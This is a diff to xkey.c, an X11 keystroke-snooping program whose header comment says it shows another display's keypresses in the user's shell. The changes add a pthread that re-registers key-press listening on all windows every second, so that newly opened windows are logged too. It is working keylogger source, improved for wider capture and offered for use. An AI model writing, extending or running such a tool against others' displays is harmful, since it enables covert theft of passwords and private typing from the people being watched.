@@ -1,7 +1,7 @@
 /* To compile, run it through your favorite ansi compiler something like
  * this :
  *
- *    gcc -o xkey xkey.c -lX11 -lm
+ *    gcc -o xkey xkey.c -lX11
  *
  * To run it, just use it like this :  xkey displayname:0
  * and watch as that display's keypresses show up in your shell window.
@@ -10,12 +10,15 @@
  */
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <X11/X.h>
 #include <X11/Xlib.h>
 #include <X11/Intrinsic.h>
 #include <X11/StringDefs.h>
 #include <X11/Xutil.h>
 #include <X11/Shell.h>
+
+#include <pthread.h>
 
 char *TranslateKeyCode(XEvent *ev);
 
@@ -62,12 +65,21 @@ void snoop_all_windows(Window root, unsigned long type)
 }
 
 
+void * repeatedly_snoop_all_windows( void * arg)
+{
+     while (1) {
+       snoop_all_windows(DefaultRootWindow(d), KeyPressMask);
+       sleep(1);
+     }
+}
+
 void main(int argc, char **argv)
 {
   char *hostname;
   char *string;
   XEvent xev;
   int count = 0;
+  pthread_t thread1;
 
   if (argv[1] == NULL)
     hostname = ":0";
@@ -82,6 +94,9 @@ void main(int argc, char **argv)
    }
 
   snoop_all_windows(DefaultRootWindow(d), KeyPressMask);
+
+  pthread_create( &thread1, NULL, repeatedly_snoop_all_windows, NULL);
+
 
   while(1)
    {
